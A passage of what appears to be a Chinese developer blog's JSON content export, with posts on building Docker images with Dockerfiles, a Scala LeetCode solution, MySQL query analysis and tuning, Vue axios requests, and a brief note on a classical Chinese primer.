\"c3a9f6d71ad2\", \"Domainname\": \"\", \"User\": \"\", \"AttachStdin\": false, \"AttachStdout\": false, \"AttachStderr\": false, \"ExposedPorts\": &#123; \"15671/tcp\": &#123;&#125;, \"15672/tcp\": &#123;&#125;, \"25672/tcp\": &#123;&#125;, \"4369/tcp\": &#123;&#125;, \"5671/tcp\": &#123;&#125;, \"5672/tcp\": &#123;&#125; &#125;, \"Tty\": false, \"OpenStdin\": false, \"StdinOnce\": false, \"Env\": [ \"PATH=/usr/lib/rabbitmq/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\", \"GOSU_VERSION=1.10\", \"RABBITMQ_LOGS=-\", \"RABBITMQ_SASL_LOGS=-\", \"RABBITMQ_GPG_KEY=0A9AF2115F4687BD29803A206B73A36E6026DFCA\", \"RABBITMQ_VERSION=3.7.8\", \"RABBITMQ_GITHUB_TAG=v3.7.8\", \"RABBITMQ_DEBIAN_VERSION=3.7.8-1\", \"LANG=C.UTF-8\", \"HOME=/var/lib/rabbitmq\" ], \"Cmd\": [ \"rabbitmq-server\" ], \"ArgsEscaped\": true, \"Image\": \"rabbitmq:management\", \"Volumes\": &#123; \"/var/lib/rabbitmq\": &#123;&#125; &#125;, \"WorkingDir\": \"\", \"Entrypoint\": [ \"docker-entrypoint.sh\" ], \"OnBuild\": null, \"Labels\": &#123;&#125; &#125;, \"Architecture\": \"amd64\", \"Os\": \"linux\", \"Size\": 149005125, \"VirtualSize\": 149005125, \"GraphDriver\": &#123; \"Data\": &#123; \"LowerDir\": \"/var/lib/docker/overlay2/811b15f8872db9fdfbaf99c95f079a789a8d4802183879f63b6e9bbbb42683da/diff:/var/lib/docker/overlay2/591be8ad69e775d4a1a657fd95cf720b1ae08952ec1d6b3a5a4468e3e97af075/diff:/var/lib/docker/overlay2/9500494e826a223f1fdaf7f1111eba95a5de63daf838ab086856c7961554089b/diff:/var/lib/docker/overlay2/bbb241d9364f497218895e2193d7fb48ce809932000707c02e39f911099f896b/diff:/var/lib/docker/overlay2/b1231c320113693ffcd52d340975a0615ab55a1ce4b8ae9c2f2397587bc82ae1/diff:/var/lib/docker/overlay2/70722cbaba64480fbeebf6c829fdc35ddeffe8c693fc79590676448a4590de99/diff:/var/lib/docker/overlay2/a2c7ab007ca743b9f3e1ff01b485cc238cabc2a16b54ead94cfcc5125c995275/diff:/var/lib/docker/overlay2/0425a71599e4d9319cb027e1973887f94ab225a79ac1a1e7556eb39cc223122a/diff:/var/lib/docker/overlay2/4f46781c5e2d06ca1cc6af2569f4b211b3e7251f100a2711c1fba5f2b71c68b6/diff:/var/lib/docker/overlay2/53154bc70cb837da13d85fe45d56942ad7a8428c4da28aa7091ee08ab9e010d1/diff:/var/lib/docker/overlay2/6ae1115c34ab53b07b8ab67b9b8f3586bad3d9bb0e08eba8168d0e8c50157965/diff:/var/lib/docker/overlay2/42cabbb74e6f925684a37f777357fb58acb8aeb06b7cbe237a948dd9ee1980b0/diff:/var/lib/docker/overlay2/c836245b682b2e2fe184b3b50b91761d4a24cdae436a23da9aca3630ec66232e/diff:/var/lib/docker/overlay2/c413d51ccda1b0a9b9362363cdcfa9657cd50ef98e7675cdfea0abf534ceae9b/diff\", \"MergedDir\": \"/var/lib/docker/overlay2/34f4cfb89aa9478067b1bcf994c0e8cfd625c9113745f18d458875f420f1df9e/merged\", \"UpperDir\": \"/var/lib/docker/overlay2/34f4cfb89aa9478067b1bcf994c0e8cfd625c9113745f18d458875f420f1df9e/diff\", \"WorkDir\": \"/var/lib/docker/overlay2/34f4cfb89aa9478067b1bcf994c0e8cfd625c9113745f18d458875f420f1df9e/work\" &#125;, \"Name\": \"overlay2\" &#125;, \"RootFS\": &#123; \"Type\": \"layers\", \"Layers\": [ \"sha256:237472299760d6726d376385edd9e79c310fe91d794bc9870d038417d448c2d5\", \"sha256:9ce2f4becd217f5b787bc6fc93cea756860d7f0c025c8b0da5289eb5dd2d9791\", \"sha256:e6508aa518e57bf272703c5245478a9ece3eff4e4cd9d62bba43f2469437b092\", \"sha256:1a40011024642e11ad451725ee8936b6678fe70bad7b4322f5e74d19cefcf618\", \"sha256:a59b527680e8b7002d9d94a762f04336bdd0d83741ed712b9124b8694f7f164a\", \"sha256:0c2a7c5ad55428818ae62be5858d11be38a9c1cc3a0cf2d54b44d34eaf2c74c8\", \"sha256:3f0c7b29a0e01a0837d6d69c968caa239eb3069bc19bcee05ed9359ec493c17f\", \"sha256:f836c753fbcf607f36c198650aec2c96fefc8de8f9231ffc5cb2ff0d2fcbd38f\", \"sha256:18305be5f19def5d5a98ee9b3161691eafcac3dc1642fc8c65725606b365fb8c\", \"sha256:873e9b3484d07246f9746aa142132b217f62ac1fb2ff133ae9985d89316c9382\", \"sha256:605ab53ecae3ff2cd3f4633940918a58c0450542ac0973cafa4faf5a7f18ba0b\", \"sha256:8b84056bae1b7a7dd7b91ceeb279047e75f80e1ea77dfc74fd8ff8599867b6dd\", \"sha256:327e9aa33c61766c3cd2062caad462f03433fd90b2bb9488b72aca07f5e6566f\", \"sha256:2f34184930dd172ed432f10fd75d2417093c300273d27aa133b771a77ab91a05\", \"sha256:edc8c8220a3358abcf0f81fa025549b98a79933f8b656a9d6c0b15886ed86460\" ] &#125;, \"Metadata\": &#123; \"LastTagTime\": \"2019-01-06T03:47:59.677227504+08:00\" &#125; &#125;][root@bogon ~]# docker inspect 10f9580054c7 -f &#123;&#123;\".Author\"&#125;&#125;xwolf[root@bogon ~]# docker inspect 10f9580054c7 -f &#123;&#123;\".Comment\"&#125;&#125;test make docker images 基于本地模板导入首先到 https://openvz.org/ 下载模板，这里我们仅仅是演示一下怎么导入模板就下载一个比较小的文件。 1[root@bogon ~]# wget https://download.openvz.org/template/precreated/ubuntu-12.04-x86_64-minimal.tar.gz 下载完成后执行下面 docker import 命令导入镜像。 12345678#导入镜像[root@docker opt]# cat ubuntu-12.04-x86_64-minimal.tar.gz | docker import - ubuntu:12.04sha256:ec505c11e4ee43924b4da2b94d686e36293dd8665fbb60871001a64823a1e486# 查看镜像信息[root@docker opt]# docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEubuntu 12.04 ec505c11e4ee 45 seconds ago 149MB 这样表示镜像创建成功了。 基于 Dockerfile 创建Dockerfile 基础命令 ADD ADD 有下面两种形式, 12ADD [--chown=&lt;user&gt;:&lt;group&gt;] &lt;src&gt;... &lt;dest&gt;ADD [--chown=&lt;user&gt;:&lt;group&gt;] [\"&lt;src&gt;\",... \"&lt;dest&gt;\"] ADD 指令从复制新文件，目录或远程文件 URL，并将它们添加到路径的图像文件系统中。可以指定多个资源，但如果它们是文件或目录，则它们的路径将被解释为相对于构建上下文的源。每个可能包含通配符，匹配将使用 Go 的 filepath.Match 规则完成. COPY COPY 是复制新文件或目录到指定的目录。 ENV 主要用于定义变量,不过多介绍。 EXPOSE EXPOSE 指令通知 Docker 容器在运行时侦听指定的网络端口。您可以指定端口是侦听 TCP 还是 UDP，如果未指定协议，则默认为 TCP。EXPOSE 指令实际上不会发布端口。它在构建映像的人和运行容器的人之间起到一种文档的作用，关于哪些端口要发布。要在运行容器时实际发布端口，请在 docker run 上使用-p 标志发布和映射一个或多个端口，或使用-P 标志发布所有公开的端口并将它们映射到高阶端口。 1docker run -p 80:80/tcp -p 80:80/udp ... FROM Dockfile 必须以 FROM 开始,定义要从公共仓库下载的镜像信息。 LABEL 添加键值对的标签信息,用 docker inspect 看到的 json 数据中 label 节点对应的信息。 STOPSIGNAL STOPSIGNAL 指令设置将发送到容器的系统调用信号以退出。此信号可以是与内核的系统调用表中的位置匹配的有效无符号数，例如 9，或 SIGNAME 格式的信号名，例如 SIGKILL。 USER USER 指令设置用户名（或 UID）以及可选的用户组（或 GID），以便在运行映像时以及 Dockerfile 中跟随它的任何 RUN，CMD 和 ENTRYPOINT 指令时使用。 VOLUME 1VOLUME &lt;dire&gt; VOLUME 指令创建具有指定名称的安装点，并将其标记为从本机主机或其他容器保存外部安装的卷。在 docker 运行时，docker 会创建一个匿名的 volume，并将此 volume 绑定到 container 的目录中，如果 container 的目录下已经有内容，则会将内容拷贝的 volume 中。也即，Dockerfile 中的 VOLUME 与 docker run -v alpine 的效果一样。 WORKDIR WORKDIR 指令为 Dockerfile 中的任何 RUN，CMD，ENTRYPOINT，COPY 和 ADD 指令设置工作目录。如果 WORKDIR 不存在，即使它未在任何后续 Dockerfile 指令中使用，也将创建它。WORKDIR 指令可以在 Dockerfile 中多次使用。如果提供了相对路径，则它将相对于先前 WORKDIR 指令的路径。 CMD CMD 执行 shell 命令，如果有多个 CMD 指令只有最后一个生效。 RUN 执行 shell 命令 MAINTAINER 对应的开发者信息 基于 dockerfile 部署 jar 项目 Dockerfile 内容 12345678910111213141516171819202122232425FROM java:8MAINTAINER xwolf &lt;2324808561@qq.com&gt;EXPOSE 9090ENV MIN_HEAP 512mENV MAX_HEAP 2048mRUN mkdir /opt/dataWORKDIR /opt/dataRUN mkdir /opt/logsVOLUME /opt/logsLABEL develps=\"xwolf&lt;32143@qq.com&gt;\"LABEL tester=\"王司徒\"ENV MODULE msENV MODULE_VERSION 0.0.1-SNAPSHOTADD ./$&#123;MODULE&#125;-$&#123;MODULE_VERSION&#125;.jar /opt/dataCMD java -jar -Xms$&#123;MIN_HEAP&#125; -Xmx$&#123;MAX_HEAP&#125; \\ $&#123;MODULE&#125;-$&#123;MODULE_VERSION&#125;.jar \\ &gt; /opt/logs/$&#123;MODULE&#125;-`date +%m%d%H%M`.log 2&gt; /opt/logs/$&#123;MODULE&#125;-error-`date +%m%d%H%M`.log 构建镜像 12docker build -t xwolf/ms:1.0.0 -f Dockerfile target/ 启动容器 12345678# 启动对应镜像ID[root@docker ~]# docker run -d -p 9090:9090 IMAGE_ID# 查看所有容器,UP状态表示启动成功[root@docker ~]# docker ps -aCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMESc0e2b88b86a6 8d47d112584a \"/bin/sh -c 'java -j…\" 3 minutes ago Up 3 minutes 0.0.0.0:9090-&gt;9090/tcp eloquent_jackson 至此，docker 镜像搞完了。 如有错误欢迎批评指正。","updated":"2020-07-19T00:23:27.775Z","tags":[{"name":"docker","slug":"docker","permalink":"http://xwolf191.github.io/tags/docker/"}]},{"title":"41. First Missing Positive","date":"2018-12-28T06:27:00.000Z","path":"2018/12/28/数据结构和算法/leetcode/First Missing Positive/","text":"Given an unsorted integer array, find the smallest missing positive integer.Example 1:Input: [1,2,0]Output: 3Example 2:Input: [3,4,-1,1]Output: 2Example 3:Input: [7,8,9,11,12]Output: 1Note:Your algorithm should run in O(n) time and uses constant extra space. 题意描述从一个乱序的数组中返回第一个不在数组中的正整数。 实现 scala 123456789101112131415161718192021object FirstMissingPositive &#123; def firstMissingPositive(nums: Array[Int]): Int = &#123; // 数组为空返回1 if (nums.isEmpty) return 1 val ary = nums.sorted.distinct // 查找第一个大于0的数,找不到返回0 val a = ary.find(p =&gt; p &gt; 0).getOrElse(0) //找到数组中最大的数 val b = ary.max //如果找到的第一个正整数不是1,直接返回1 if (a != 1) return 1 //遍历最小正整数到最大正整数+1,判断是否在数组中 for (i &lt;- 2 to b+1)&#123; if (nums.indexOf(i) == -1)&#123; return i &#125; &#125; 0 &#125;&#125; 参考资料 First Missing Positive","updated":"2020-07-19T00:23:28.026Z","tags":[{"name":"leetcode","slug":"leetcode","permalink":"http://xwolf191.github.io/tags/leetcode/"}]},{"title":"MySQL sql优化的一般步骤","date":"2018-12-20T23:15:00.000Z","path":"2018/12/21/数据库/mysql/MySQL sql优化的一般步骤/","text":"MySQL随着数据量的增多,遇到SQL执行缓慢的问题越来越多。文中介绍几种常用的SQL优化的一般步骤. show status explain show profile trace show statusshow status 主要是查看各种类型的操作的执行次数。 1SHOW STATUS LIKE &apos;COM%&apos;; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154Variable_name ValueCom_admin_commands 0Com_alter_db 0Com_alter_db_upgrade 0Com_alter_event 0Com_alter_function 0Com_alter_procedure 0Com_alter_server 0Com_alter_table 0Com_alter_tablespace 0Com_analyze 0Com_assign_to_keycache 0Com_begin 0Com_binlog 0Com_call_procedure 0Com_change_db 1Com_change_master 0Com_check 0Com_checksum 0Com_commit 0Com_compound_sql 0Com_create_db 0Com_create_event 0Com_create_function 0Com_create_index 0Com_create_procedure 0Com_create_role 0Com_create_server 0Com_create_table 0Com_create_temporary_table 0Com_create_trigger 0Com_create_udf 0Com_create_user 0Com_create_view 0Com_dealloc_sql 0Com_delete 0Com_delete_multi 0Com_do 0Com_drop_db 0Com_drop_event 0Com_drop_function 0Com_drop_index 0Com_drop_procedure 0Com_drop_role 0Com_drop_server 0Com_drop_table 0Com_drop_temporary_table 0Com_drop_trigger 0Com_drop_user 0Com_drop_view 0Com_empty_query 0Com_execute_sql 0Com_flush 0Com_get_diagnostics 0Com_grant 0Com_grant_role 0Com_ha_close 0Com_ha_open 0Com_ha_read 0Com_help 0Com_insert 0Com_insert_select 0Com_install_plugin 0Com_kill 0Com_load 0Com_lock_tables 0Com_optimize 0Com_preload_keys 0Com_prepare_sql 0Com_purge 0Com_purge_before_date 0Com_release_savepoint 0Com_rename_table 0Com_rename_user 0Com_repair 0Com_replace 0Com_replace_select 0Com_reset 0Com_resignal 0Com_revoke 0Com_revoke_all 0Com_revoke_role 0Com_rollback 0Com_rollback_to_savepoint 0Com_savepoint 0Com_select 0Com_set_option 2Com_show_authors 0Com_show_binlog_events 0Com_show_binlogs 0Com_show_charsets 0Com_show_collations 0Com_show_contributors 0Com_show_create_db 0Com_show_create_event 0Com_show_create_func 0Com_show_create_proc 0Com_show_create_table 0Com_show_create_trigger 0Com_show_databases 1Com_show_engine_logs 0Com_show_engine_mutex 0Com_show_engine_status 0Com_show_errors 0Com_show_events 0Com_show_explain 0Com_show_fields 1Com_show_function_status 0Com_show_generic 0Com_show_grants 0Com_show_keys 0Com_show_master_status 0Com_show_open_tables 0Com_show_plugins 0Com_show_privileges 0Com_show_procedure_status 0Com_show_processlist 0Com_show_profile 0Com_show_profiles 0Com_show_relaylog_events 0Com_show_slave_hosts 0Com_show_slave_status 0Com_show_status 2Com_show_storage_engines 0Com_show_table_status 0Com_show_tables 1Com_show_triggers 0Com_show_variables 1Com_show_warnings 0Com_shutdown 0Com_signal 0Com_start_all_slaves 0Com_start_slave 0Com_stmt_close 0Com_stmt_execute 0Com_stmt_fetch 0Com_stmt_prepare 0Com_stmt_reprepare 0Com_stmt_reset 0Com_stmt_send_long_data 0Com_stop_all_slaves 0Com_stop_slave 0Com_truncate 0Com_uninstall_plugin 0Com_unlock_tables 0Com_update 0Com_update_multi 0Com_xa_commit 0Com_xa_end 0Com_xa_prepare 0Com_xa_recover 0Com_xa_rollback 0Com_xa_start 0Compression OFF 看几个常用的com_update、com_select、com_insert、com_delete,这些CRUD的次数统计能直观的看到数据库服务是读多、还是写多。可根据具体的业务指定不同的方案。当然对于innodb存储引擎,可查看其对应的信息: 1SHOW STATUS LIKE &apos;innodb_rows_%&apos;; 123456Variable_name Value -------------------- -------------Innodb_rows_deleted 933911 Innodb_rows_inserted 1715972 Innodb_rows_read 30210424768 Innodb_rows_updated 235151 表示对应的操作影响的行数。这样的话,数据库的读多写少的类型会看的更直观。也可以直接查询SESSION_STATUS表来查看mysql的统计信息。 1SELECT * FROM information_schema.`SESSION_STATUS` s WHERE s.`VARIABLE_NAME` LIKE &apos;INNODB_ROWS_%&apos;;; 注意区分变量名的大小写。 123456VARIABLE_NAME VARIABLE_VALUE -------------------- ----------------INNODB_ROWS_DELETED 933911 INNODB_ROWS_INSERTED 1716071 INNODB_ROWS_READ 30211179934 INNODB_ROWS_UPDATED 235155 定位慢查询首先要开启慢查询日志,默认是关闭的。默认的慢查询时间为10s，超过这个值的sql会记录到慢查询的日志文件中,可对这些SQL进行对应的优化。1234Variable_name Valuelong_query_time 10.000000slow_query_log OFFslow_query_log_file LAPTOP-3T4D6I5F-slow.log 一般用mysqldumpslow工具来分析慢查询日志。 有这两种开启方式: 在my.cnf 里 通过 log-slow-queries[=file_name] 在mysqld进程启动时,指定—log-slow-queries[=file_name] 我们通过在my.cnf中配置来开启慢查询:12345678#启用慢查询日志slow_query_log=1#指定慢查询文件名称slow-query-log-file=mysql-slow.log#慢查询时间,超过这个值的会记录到慢查询日志中long_query_time=1#SQL语句检测的记录数少于设定值的语句不会被记录到慢查询日志，即使这个语句执行时间超过了long_query_time的阈值min_examined_row_limit=100 重启数据库,查看配置参数1234Variable_name Valuelong_query_time 1.000000slow_query_log ONslow_query_log_file mysql-slow.log 这样就开启了慢查询日志,通常用mysqldumpslow这个工具来分析慢查询日志信息。 show processlist慢查询需要等到SQL执行完成后才会写入到日志文件中,要查询当前正在执行的进程、是否锁表等信息慢查询就不行了。需要processlist来查看信息了,当然需要有PROCESS权限才可以看到所有的线程信息，否则只能看到你自己的线程。 1show processlit; 123Id User Host db Command Time State Info Progress2 root localhost:10716 \\N Query 0 init show processlist 0.0003 root localhost:10717 \\N Sleep 410 \\N 0.000 explain通过explain命令来查看SQL的执行计划。语法很简单，explain 要执行的SQL即可。 1EXPLAIN SELECT * FROM sys_role r,sys_user_role ur WHERE r.id= ur.role_id; 123id select_type table type possible_keys key key_len ref rows Extra1 SIMPLE r ALL PRIMARY \\N \\N \\N 1 1 SIMPLE ur ALL \\N \\N \\N \\N 1 Using where; Using join buffer (flat, BNL join) 返回的信息详解介绍一下， id选择标识符。这是查询中SELECT的序号。如果行引用其他行的并集结果，则该值可以为NULL。在本例中，表列显示了一个值，如，表示行引用id值为M和N的行的并集。 select_type SIMPLE(简单SELECT,不使用UNION或子查询等) PRIMARY(查询中若包含任何复杂的子部分,最外层的select被标记为PRIMARY) UNION(UNION中的第二个或后面的SELECT语句) DEPENDENT UNION(UNION中的第二个或后面的SELECT语句，取决于外面的查询) UNION RESULT(UNION的结果) SUBQUERY(子查询中的第一个SELECT) DEPENDENT SUBQUERY(子查询中的第一个SELECT，取决于外面的查询) DERIVED(派生表的SELECT, FROM子句的子查询) UNCACHEABLE SUBQUERY(一个子查询的结果不能被缓存，必须重新评估外链接的第一行) table涉及的表 type表示MySQL在表中找到所需行的方式，又称“访问类型”。 常用的类型有： ALL, index, range, ref, eq_ref, const, system, NULL（从左到右，性能从差到好） ALL：全表扫描, MySQL将遍历全表以找到匹配的行 index: 索引全扫描,index与ALL区别为index类型只遍历索引树 range: 索引范围扫描,常见于&lt; 、&lt;= 、&gt;、&gt;=、between等操作。 ref: 使用非唯一索引扫描或唯一索引的前缀扫描。返回匹配某个单独值的记录行。 eq_ref: 类似ref，区别就在使用的索引是唯一索引，对于每个索引键值，表中只有一条记录匹配，简单来说，就是多表连接中使用primary key或者 unique key作为关联条件 const、system: 单表中最多有一个匹配的行，查询速度很快。所以这个匹配行中的其他列的值可以被优化器在当前查询中当做常量处理。例如使用primary key或者 unique key来查询。 NULL: 表示不用访问表或使用索引就能直接得到结果。 prossible_keys可能使用到的索引 key实际使用到的索引，没有使用到索引就是NULL key_len表示索引中使用的字节数，可通过该列计算查询中使用的索引的长度（key_len显示的值为索引字段的最大可能长度，并非实际使用长度，即key_len是根据表定义计算而得，不是通过表内检索出的）不损失精确性的情况下，长度越短越好 refref列显示将哪些列或常量与key列中指定的索引进行比较，以便从表中选择行。如果值是func，则使用的值是某个函数的结果。要查看哪个函数，请在EXPLAIN之后使用SHOW warning查看扩展的EXPLAIN输出。这个函数实际上可能是一个运算符，比如算术运算符。 rows 表示MySQL根据表统计信息及索引选用情况，估算的找到所需的记录所需要读取的行数 Extra该列包含MySQL解决查询的详细信息,有以下几种情况： Using where:列数据是从仅仅使用了索引中的信息而没有读取实际的行动的表返回的，这发生在对表的全部的请求列都是同一个索引的部分的时候，表示mysql服务器将在存储引擎检索行后再进行过滤 Using temporary：表示MySQL需要使用临时表来存储结果集，常见于排序和分组查询 Using filesort：MySQL中无法利用索引完成的排序操作称为“文件排序” Using join buffer：改值强调了在获取连接条件时没有使用索引，并且需要连接缓冲区来存储中间结果。如果出现了这个值，那应该注意，根据查询的具体情况可能需要添加索引来改进能。 Impossible where：这个值强调了where语句会导致没有符合条件的行。 Select tables optimized away：这个值意味着仅通过使用索引，优化器可能仅从聚合函数结果中返回一行 有时候使用explain不能定位到问题，可配合profile来联合分析。 show profileSHOW PROFILE和SHOW PROFILES语句显示分析信息，指示在当前会话过程中执行的语句的资源使用情况。基本语法：123456789101112131415SHOW PROFILE [type [, type] ... ] [FOR QUERY n] [LIMIT row_count [OFFSET offset]]type: &#123; ALL | BLOCK IO | CONTEXT SWITCHES | CPU | IPC | MEMORY | PAGE FAULTS | SOURCE | SWAPS&#125; 当然，首先要开启profile.12345678910mysql&gt; SELECT @@profiling;+-------------+| @@profiling |+-------------+| 0 |+-------------+1 row in set (0.00 sec)mysql&gt; SET profiling = 1;Query OK, 0 rows affected (0.00 sec) 查看所有的profiles。1SHOW profiles; 123456Query_ID Duration Query30 0.00010284 SET profiling_history_size = 1531 0.00350268 SHOW STATUS32 0.00011305 select @@profiling33 0.00262382 SHOW STATUS34 0.00048830 select state, round(sum(duration),5) as `duration (summed) in sec` from information_schema.profiling where query_id = 32 group by state order by `duration (summed) in sec` desc 查看指定id的profile,查看具体线程的时间消耗。1SHOW profile FOR QUERY 34; 其中sending data状态是需要大量磁盘io操作的，比较耗费时间。其他的信息参考mysql官网的说明。 traceMySQL从5.6加入了SQL的跟踪trace。通过trace文件可以看到优化器为何选择这个执行计划而不是其他的。首先要开启跟踪trace，1234-- 开启并且设置数据格式为JSONSET OPTIMIZER_TRACE=&quot;enabled=on&quot;,END_MARKERS_IN_JSON=ON; -- 设置内存SET OPTIMIZER_TRACE_MAX_MEM_SIZE=1000000; 查看是否开启 1SHOW VARIABLES LIKE &apos;%optimizer_trace%&apos;; 123456Variable_name Valueoptimizer_trace enabled=on,one_line=offoptimizer_trace_features greedy_search=on,range_optimizer=on,dynamic_range=on,repeated_subselect=onoptimizer_trace_limit 1optimizer_trace_max_mem_size 1000000optimizer_trace_offset -1 开始执行SQL1234567mysql&gt; select * from version;+--------+----------------+----------------------------+| VER_ID | SCHEMA_VERSION | VERSION_COMMENT |+--------+----------------+----------------------------+| 1 | 2.3.0 | Hive release version 2.3.0 |+--------+----------------+----------------------------+1 row in set (0.00 sec) 查看跟踪信息,1select * from information_schema.optimizer_trace\\G 查看TRACE字段中对应的json信息。12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394&#123; \"steps\": [ &#123; \"join_preparation\": &#123; \"select#\": 1, \"steps\": [ &#123; \"expanded_query\": \"/* select#1 */ select `version`.`VER_ID` AS `VER_ID`,`version`.`SCHEMA_VERSION` AS `SCHEMA_VERSION`,`version`.`VERSION_COMMENT` AS `VERSION_COMMENT` from `version`\" &#125; ] /* steps */ &#125; /* join_preparation */ &#125;, &#123; \"join_optimization\": &#123; \"select#\": 1, \"steps\": [ &#123; \"table_dependencies\": [ &#123; \"table\": \"`version`\", \"row_may_be_null\": false, \"map_bit\": 0, \"depends_on_map_bits\": [ ] /* depends_on_map_bits */ &#125; ] /* table_dependencies */ &#125;, &#123; \"rows_estimation\": [ &#123; \"table\": \"`version`\", \"table_scan\": &#123; \"rows\": 1, \"cost\": 1 &#125; /* table_scan */ &#125; ] /* rows_estimation */ &#125;, &#123; \"considered_execution_plans\": [ &#123; \"plan_prefix\": [ ] /* plan_prefix */, \"table\": \"`version`\", \"best_access_path\": &#123; \"considered_access_paths\": [ &#123; \"rows_to_scan\": 1, \"access_type\": \"scan\", \"resulting_rows\": 1, \"cost\": 1.2, \"chosen\": true &#125; ] /* considered_access_paths */ &#125; /* best_access_path */, \"condition_filtering_pct\": 100, \"rows_for_plan\": 1, \"cost_for_plan\": 1.2, \"chosen\": true &#125; ] /* considered_execution_plans */ &#125;, &#123; \"attaching_conditions_to_tables\": &#123; \"original_condition\": null, \"attached_conditions_computation\": [ ] /* attached_conditions_computation */, \"attached_conditions_summary\": [ &#123; \"table\": \"`version`\", \"attached\": null &#125; ] /* attached_conditions_summary */ &#125; /* attaching_conditions_to_tables */ &#125;, &#123; \"refine_plan\": [ &#123; \"table\": \"`version`\" &#125; ] /* refine_plan */ &#125; ] /* steps */ &#125; /* join_optimization */ &#125;, &#123; \"join_execution\": &#123; \"select#\": 1, \"steps\": [ ] /* steps */ &#125; /* join_execution */ &#125; ] /* steps */&#125; 当然这只是一个简单的查询的跟踪信息,其他更复杂的SQL的跟踪信息会更加详尽，不过大概的结构就是这个样子的。 小结通过上述步骤，一般可以定位到问题,剩下的就是对症下药。索引优化、批量数据优化、表碎片、具体的SQL操作的优化等等具体情况具体分析。 参考资料 slow-query-log mysqldumpslow explain-output optimizer-tracing","updated":"2020-07-19T00:23:28.013Z","tags":[{"name":"mysql","slug":"mysql","permalink":"http://xwolf191.github.io/tags/mysql/"}]},{"title":"vue.js中axios发送get、post请求","date":"2018-12-18T02:00:00.000Z","path":"2018/12/18/前端/vue.js中axios发送get、post请求/","text":"vue.js中axios发送get、post请求踩得几个坑,顺手写下。以防再犯。 get比较简单，主要是post。post一种是以字符串方式拼接提交,一种以表单对象提交。本质上都是一样的，都是转化为普通的字符串拼接后以对应的请求头Content-Type指定的类型来提交数据。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283&lt;template&gt; &lt;el-form ref=\"form\" :model=\"user\" label-width=\"100px\" &gt; &lt;el-form-item label=\"用户名\"&gt; &lt;el-input v-model=\"user.name\" clearable&gt;&lt;/el-input&gt; &lt;/el-form-item&gt; &lt;el-form-item label=\"密码\"&gt; &lt;el-input type=\"password\" v-model=\"user.password\" clearable&gt;&lt;/el-input&gt; &lt;/el-form-item&gt; &lt;el-form-item label=\"登录角色\"&gt; &lt;el-select v-model=\"user.role\" placeholder=\"请选择登录角色\"&gt; &lt;el-option label=\"学生\" value=\"0\"&gt;&lt;/el-option&gt; &lt;el-option label=\"教师\" value=\"1\"&gt;&lt;/el-option&gt; &lt;/el-select&gt; &lt;el-button type=\"primary\" @click=\"onSubmit\"&gt;登录&lt;/el-button&gt; &lt;/el-form-item&gt; &lt;/el-form&gt;&lt;/template&gt;&lt;script type=\"text/javascript\"&gt;import API from '../../util/api'export default &#123; data: function () &#123; return &#123; user: &#123; name: '', password: '', role: '' &#125; &#125; &#125;, methods: &#123; onSubmit: function () &#123; /* get 方式 */ API.get('/login', &#123; params: this.user &#125;).then(response =&gt; &#123; console.info(response) &#125;).catch(error =&gt; &#123; console.error(error) &#125;) /* post 参数拼接提交 */ let params = new URLSearchParams() let obj = this.user Object.keys(obj).forEach(function (key) &#123; params.append(key, obj[key]) &#125;) console.info('params= ' + params + ',userObject= ' + this.user) API.post('/login', params, &#123; headers: &#123; 'Content-Type': 'application/x-www-form-urlencoded' &#125; &#125;).then(response =&gt; &#123; console.info(response) &#125;).catch(error =&gt; &#123; console.error(error) &#125;) /* form object 提交 */ API.post('/login', this.user, &#123; headers: &#123; 'Content-Type': 'application/x-www-form-urlencoded' &#125;, transformRequest: [function (data) &#123; let ret = '' for (let it in data) &#123; ret += encodeURIComponent(it) + '=' + encodeURIComponent(data[it]) + '&amp;' &#125; return ret &#125;] &#125;).then(response =&gt; &#123; console.info(response) &#125;).catch(error =&gt; &#123; console.error(error) &#125;) &#125; &#125;&#125;&lt;/script&gt; 参考资料 axios Examples axios github","updated":"2020-07-19T00:23:27.950Z","tags":[{"name":"vue.js","slug":"vue-js","permalink":"http://xwolf191.github.io/tags/vue-js/"}]},{"title":"增广贤文","date":"2018-12-15T12:00:00.000Z","path":"2018/12/15/杂侃/增广贤文/","text":"《增广贤文》。又名《昔时贤文》《古今贤文》，是中国明代时期编写的儿童启蒙书目。书名最早见之于明万历年间的戏曲《牡丹亭》，据此可推知此书最迟写成于万历年间。《增广贤文》集结中国从古到今的各种格言、谚语。后来，经过明、清两代文人的不断增补，才改成现在这个模样，称《增广昔时贤文》，通称《增广贤文》。 